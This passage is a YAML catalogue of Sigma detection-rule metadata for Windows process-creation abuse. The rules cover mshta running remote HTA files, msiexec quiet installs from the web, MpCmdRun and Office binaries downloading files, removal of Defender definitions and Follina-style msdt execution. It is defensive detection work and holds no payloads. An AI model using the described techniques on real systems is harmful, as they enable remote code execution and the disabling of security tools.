  - https://strontic.github.io/xcyclopedia/library/mode.com-59D1ED51ACB8C3D50F1306FD75F20E99.html
  - https://www.virustotal.com/gui/file/5e75ef02517afd6e8ba6462b19217dc4a5a574abb33d10eb0f2bab49d8d48c22/behavior
  false_positives:
  - Russian speaking people changing the CodePage
  notes: ''
- detection_id: 1dd05363-104e-4b4a-b963-196a534b03a1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mofcomp_execution.yml
  name: Potential Suspicious Mofcomp Execution
  description: 'Detects execution of the "mofcomp" utility as a child of a suspicious
    shell or script running utility or by having a suspicious path in the commandline.

    The "mofcomp" utility parses a file containing MOF statements and adds the classes
    and class instances defined in the file to the WMI repository.

    Attackers abuse this utility to install malicious MOF scripts

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
  - https://github.com/The-DFIR-Report/Sigma-Rules/blob/75260568a7ffe61b2458ca05f6f25914efb44337/win_mofcomp_execution.yml
  - https://learn.microsoft.com/en-us/windows/win32/wmisdk/mofcomp
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7002aa10-b8d4-47ae-b5ba-51ab07e228b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mpcmdrun_dll_sideload_defender.yml
  name: Potential Mpclient.DLL Sideloading Via Defender Binaries
  description: Detects potential sideloading of "mpclient.dll" by Windows Defender
    processes ("MpCmdRun" and "NisSrv") from their non-default directory.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 46123129-1024-423e-9fae-43af4a0fa9a5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mpcmdrun_download_arbitrary_file.yml
  name: File Download Via Windows Defender MpCmpRun.EXE
  description: Detects the use of Windows Defender MpCmdRun.EXE to download files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://web.archive.org/web/20200903194959/https://twitter.com/djmtshepana/status/1301608169496612866
  - https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9719a8aa-401c-41af-8108-ced7ec9cd75c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mpcmdrun_remove_windows_defender_definition.yml
  name: Windows Defender Definition Files Removed
  description: Adversaries may disable security tools to avoid possible detection
    of their tools and activities by removing Windows Defender Definition Files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 33be4333-2c6b-44f4-ae28-102cdbde0a31
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msbuild_susp_parent_process.yml
  name: Suspicious Msbuild Execution By Uncommon Parent Process
  description: Detects suspicious execution of 'Msbuild.exe' by a uncommon parent
    process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://app.any.run/tasks/abdf586e-df0c-4d39-89a7-06bf24913401/
  - https://www.echotrail.io/insights/search/msbuild.exe
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9c8c7000-3065-44a8-a555-79bcba5d9955
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msdt_answer_file_exec.yml
  name: MSDT Execution Via Answer File
  description: 'Detects execution of "msdt.exe" using an answer file which is simulating
    the legitimate way of calling msdt via "pcwrun.exe" (For example from the compatibility
    tab).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.execution
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Msdt/
  false_positives:
  - Possible undocumented parents of "msdt" other than "pcwrun".
  notes: ''
- detection_id: 258fc8ce-8352-443a-9120-8a11e4857fa5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml
  name: Potential Arbitrary Command Execution Using Msdt.EXE
  description: Detects processes leveraging the "ms-msdt" handler or the "msdt.exe"
    binary to execute arbitrary commands as seen in the follina (CVE-2022-30190) vulnerability
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://twitter.com/nao_sec/status/1530196847679401984
  - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/
  - https://twitter.com/_JohnHammond/status/1531672601067675648
  false_positives:
  - Unknown
  notes: ''
- detection_id: dc4576d4-7467-424f-9eee-fd2b02855fe0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msdt_susp_cab_options.yml
  name: Suspicious Cabinet File Execution Via Msdt.EXE
  description: Detects execution of msdt.exe using the "cab" flag which could indicates
    suspicious diagcab files with embedded answer files leveraging CVE-2022-30190
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1537896324837781506
  - https://github.com/GossiTheDog/ThreatHunting/blob/e85884abbf05d5b41efc809ea6532b10b45bd05c/AdvancedHuntingQueries/DogWalk-DiagCab
  - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-9015912909545e72ed42cbac4d1e96295e8964579c406d23fd9c47a8091576a0
  - https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd
  false_positives:
  - Legitimate usage of ".diagcab" files
  notes: ''
- detection_id: 7a74da6b-ea76-47db-92cc-874ad90df734
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msdt_susp_parent.yml
  name: Suspicious MSDT Parent Process
  description: Detects msdt.exe executed by a suspicious parent as seen in CVE-2022-30190
    / Follina exploitation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/nao_sec/status/1530196847679401984
  - https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e84d89c4-f544-41ca-a6af-4b92fd38b023
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msedge_proxy_download.yml
  name: Arbitrary File Download Via MSEDGE_PROXY.EXE
  description: Detects usage of "msedge_proxy.exe" to download arbitrary files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b98d0db6-511d-45de-ad02-e82a98729620
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mshta_http.yml
  name: Remotely Hosted HTA File Executed Via Mshta.EXE
  description: Detects execution of the "mshta" utility with an argument containing
    the "http" keyword, which could indicate that an attacker is executing a remotely
    hosted malicious hta file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.005
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218.005
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2c28c248-7f50-417a-9186-a85b223010ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mshta_inline_vbscript.yml
  name: Wscript Shell Run In CommandLine
  description: Detects the presence of the keywords "Wscript", "Shell" and "Run" in
    the command, which could indicate a suspicious activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://web.archive.org/web/20220830122045/http://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html
  - https://blog.talosintelligence.com/modernloader-delivers-multiple-stealers-cryptominers-and-rats/
  false_positives:
  - Inline scripting can be used by some rare third party applications or administrators.
    Investigate and apply additional filters accordingly
  notes: ''
- detection_id: 67f113fa-e23d-4271-befa-30113b3e08b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mshta_javascript.yml
  name: Suspicious JavaScript Execution Via Mshta.EXE
  description: Detects execution of javascript code using "mshta.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.005
  tags:
  - attack.defense-evasion
  - attack.t1218.005
  time_window: ''
  references:
  - https://eqllib.readthedocs.io/en/latest/analytics/6bc283c4-21f2-4aed-a05c-a9a3ffa95dd4.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.005/T1218.005.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: ed5d72a6-f8f4-479d-ba79-02f6a80d7471
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mshta_lethalhta_technique.yml
  name: Potential LethalHTA Technique Execution
  description: Detects potential LethalHTA technique where the "mshta.exe" is spawned
    by an "svchost.exe" process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.005
  tags:
  - attack.defense-evasion
  - attack.t1218.005
  time_window: ''
  references:
  - https://codewhitesec.blogspot.com/2018/07/lethalhta.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 03cc0c25-389f-4bf8-b48d-11878079f1ca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml
  name: Suspicious MSHTA Child Process
  description: Detects a suspicious process spawning from an "mshta.exe" process,
    which could be indicative of a malicious HTA script execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.005
  tags:
  - attack.defense-evasion
  - attack.t1218.005
  - car.2013-02-003
  - car.2013-03-001
  - car.2014-04-003
  time_window: ''
  references:
  - https://www.trustedsec.com/july-2015/malicious-htas/
  false_positives:
  - Printer software / driver installations
  - HP software
  notes: ''
- detection_id: cc7abbd0-762b-41e3-8a26-57ad50d2eea3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mshta_susp_execution.yml
  name: MSHTA Execution with Suspicious File Extensions
  description: 'Detects execution of mshta.exe with file types that looks like they
    do not typically represent HTA (HTML Application) content,

    such as .png, .jpg, .zip, .pdf, and others, which are often polyglots. MSHTA is
    a legitimate Windows utility for executing HTML Applications

    containing VBScript or JScript. Threat actors often abuse this lolbin utility
    to download and

    execute malicious scripts disguised as benign files or hosted under misleading
    extensions to evade detection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.007
  - T1140
  - T1218.005
  tags:
  - attack.defense-evasion
  - attack.t1140
  - attack.t1218.005
  - attack.execution
  - attack.t1059.007
  - cve.2020-1599
  time_window: ''
  references:
  - http://blog.sevagas.com/?Hacking-around-HTA-files
  - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356
  - https://learn.microsoft.com/en-us/previous-versions/dotnet/framework/data/xml/xslt/xslt-stylesheet-scripting-using-msxsl-script
  - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997
  - https://twitter.com/mattifestation/status/1326228491302563846
  - https://www.virustotal.com/gui/file/c1f27d9795a2eba630db8a043580a0761798f06370fb1317067805f8a845b00c
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
  notes: ''
- detection_id: e32f92d1-523e-49c3-9374-bdb13b46a3ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mshta_susp_pattern.yml
  name: Suspicious Mshta.EXE Execution Patterns
  description: Detects suspicious mshta process execution patterns
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1106
  tags:
  - attack.execution
  - attack.t1106
  time_window: ''
  references:
  - https://en.wikipedia.org/wiki/HTML_Application
  - https://www.echotrail.io/insights/search/mshta.exe
  - https://app.any.run/tasks/34221348-072d-4b70-93f3-aa71f6ebecad/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 84f52741-8834-4a8c-a413-2eb2269aa6c8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msiexec_dll.yml
  name: DllUnregisterServer Function Call Via Msiexec.EXE
  description: Detects MsiExec loading a DLL and calling its DllUnregisterServer function
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.007
  tags:
  - attack.defense-evasion
  - attack.t1218.007
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md
  - https://lolbas-project.github.io/lolbas/Binaries/Msiexec/
  - https://twitter.com/_st0pp3r_/status/1583914515996897281
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4a2a2c3e-209f-4d01-b513-4155a540b469
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msiexec_embedding.yml
  name: Suspicious MsiExec Embedding Parent
  description: Adversaries may abuse msiexec.exe to proxy the execution of malicious
    payloads
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.007
  tags:
  - attack.t1218.007
  - attack.defense-evasion
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6f4191bb-912b-48a8-9ce7-682769541e6d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msiexec_execute_dll.yml
  name: Suspicious Msiexec Execute Arbitrary DLL
  description: 'Adversaries may abuse msiexec.exe to proxy execution of malicious
    payloads.

    Msiexec.exe is the command-line utility for the Windows Installer and is thus
    commonly associated with executing installation packages (.msi)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.007
  tags:
  - attack.defense-evasion
  - attack.t1218.007
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md
  - https://twitter.com/_st0pp3r_/status/1583914515996897281
  false_positives:
  - Legitimate script
  notes: ''
- detection_id: 79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml
  name: Msiexec Quiet Installation
  description: 'Adversaries may abuse msiexec.exe to proxy execution of malicious
    payloads.

    Msiexec.exe is the command-line utility for the Windows Installer and is thus
    commonly associated with executing installation packages (.msi)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.007
  tags:
  - attack.defense-evasion
  - attack.t1218.007
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md
  - https://twitter.com/_st0pp3r_/status/1583914244344799235
  false_positives:
  - WindowsApps installing updates via the quiet flag
  notes: ''
- detection_id: 8150732a-0c9d-4a99-82b9-9efb9b90c40c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msiexec_install_remote.yml
  name: Suspicious Msiexec Quiet Install From Remote Location
  description: Detects usage of Msiexec.exe to install packages hosted remotely quietly
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.007
  tags:
  - attack.defense-evasion
  - attack.t1218.007
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e22a6eb2-f8a5-44b5-8b44-a2dbd47b1144
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msiexec_masquerading.yml
  name: Potential MsiExec Masquerading
  description: Detects the execution of msiexec.exe from an uncommon directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.005
  time_window: ''
  references:
  - https://twitter.com/200_okay_/status/1194765831911215104
  false_positives:
  - Unknown
  notes: ''
- detection_id: f7b5f842-a6af-4da5-9e95-e32478f3cd2f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msiexec_web_install.yml
  name: MsiExec Web Install
  description: Detects suspicious msiexec process starts with web addresses as parameter
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1218.007
  tags:
  - attack.defense-evasion
  - attack.t1218.007
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/
  false_positives:
  - False positives depend on scripts and administrative tools used in the monitored
    environment
  notes: ''
- detection_id: 459f2f98-397b-4a4a-9f47-6a5ec2f1c69d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msohtmed_download.yml
  name: Arbitrary File Download Via MSOHTMED.EXE
  description: Detects usage of "MSOHTMED" to download arbitrary files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3b3c7f55-f771-4dd6-8a6e-08d057a17caf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mspub_download.yml
  name: Arbitrary File Download Via MSPUB.EXE
  description: Detects usage of "MSPUB" (Microsoft Publisher) to download arbitrary
    files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/pull/238/files
  false_positives:
  - Unknown
  notes: ''
- detection_id: 744a188b-0415-4792-896f-11ddb0588dbc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_msra_process_injection.yml
  name: Potential Process Injection Via Msra.EXE
  description: Detects potential process injection via Microsoft Remote Asssistance
    (Msra.exe) by looking at suspicious child processes spawned from the aforementioned
    process. It has been a target used by many threat actors and used for discovery
    and persistence tactics
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/12/09/a-closer-look-at-qakbots-latest-building-blocks-and-how-to-knock-them-down/
  - https://www.fortinet.com/content/dam/fortinet/assets/analyst-reports/ar-qakbot.pdf
  false_positives:
  - Legitimate use of Msra.exe
  notes: ''
- detection_id: 0152550d-3a26-4efd-9f0e-54a0b28ae2f3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mssql_sqlps_susp_execution.yml
  name: Detection of PowerShell Execution via Sqlps.exe
  description: 'This rule detects execution of a PowerShell code through the sqlps.exe
    utility, which is included in the standard set of utilities supplied with the
    MSSQL Server.

    Script blocks are not logged in this case, so this utility helps to bypass protection
    mechanisms based on the analysis of these logs.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1127
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sql/tools/sqlps-utility?view=sql-server-ver15
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/
  - https://twitter.com/bryon_/status/975835709587075072
  false_positives:
  - Direct PS command execution through SQLPS.exe is uncommon, childprocess sqlps.exe
    spawned by sqlagent.exe is a legitimate action.
  notes: ''
- detection_id: a746c9b8-a2fb-4ee5-a428-92bee9e99060
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mssql_sqltoolsps_susp_execution.yml
  name: SQL Client Tools PowerShell Session Detection
  description: 'This rule detects execution of a PowerShell code through the sqltoolsps.exe
    utility, which is included in the standard set of utilities supplied with the
    Microsoft SQL Server Management studio.

    Script blocks are not logged in this case, so this utility helps to bypass protection
    mechanisms based on the analysis of these logs.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1127
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://github.com/LOLBAS-Project/LOLBAS/blob/8283d8d91552213ded165fd36deb6cb9534cb443/yml/OtherMSBinaries/Sqltoolsps.yml
  - https://twitter.com/pabraeken/status/993298228840992768
  false_positives:
  - Direct PS command execution through SQLToolsPS.exe is uncommon, childprocess sqltoolsps.exe
    spawned by smss.exe is a legitimate action.
  notes: ''
- detection_id: 869b9ca7-9ea2-4a5a-8325-e80e62f75445
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mssql_susp_child_process.yml
  name: Suspicious Child Process Of SQL Server
  description: Detects suspicious child processes of the SQLServer process. This could
    indicate potential RCE or SQL Injection.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.t1505.003
  - attack.t1190
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - Internal Research
  false_positives: []
  notes: ''
- detection_id: d55b793d-f847-4eea-b59a-5ab09908ac90
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_mssql_veaam_susp_child_processes.yml
  name: Suspicious Child Process Of Veeam Dabatase
  description: Detects suspicious child processes of the Veeam service process. This
    could indicate potential RCE or SQL Injection.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives: []
  notes: ''
